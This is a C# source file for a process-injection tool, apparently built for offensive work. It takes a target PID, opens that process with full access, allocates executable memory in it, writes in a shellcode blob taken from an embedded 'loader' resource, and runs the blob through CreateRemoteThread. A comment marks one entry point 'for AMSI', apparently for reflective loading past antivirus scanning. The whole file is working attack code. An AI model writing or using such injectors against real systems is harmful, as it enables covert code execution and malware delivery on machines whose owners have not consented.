using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Inject
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static void test(string[] args){ //for AMSI
            Main(args);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("DEBUG:: OpenProcess");
            //Console.WriteLine("Please enter the PID to inject into ...");
            var target_pid = Int32.Parse(args[0]);
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, target_pid); //PROCESS_ALL_ACCESS (0x001F0FFF) //dwProcessId == 4804 //bInheritHandle for child process

            Console.WriteLine("DEBUG:: VirtualAllocEx");
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x10000, 0x3000, 0x40); //PAGE_EXECUTE_READWRITE (0x40) //IntPtr.Zero == null, auto //MEM_COMMIT and MEM_RESERVE (0x3000)
            //Console.ReadLine();
            //byte[] buf = new byte[591]
            
            byte[] buf = Properties.Resources.loader;

            IntPtr outSize;
            Console.WriteLine("DEBUG:: WriteProcessMemory");
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            //Console.ReadLine();
            Console.WriteLine("DEBUG:: CreateRemoteThread");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}
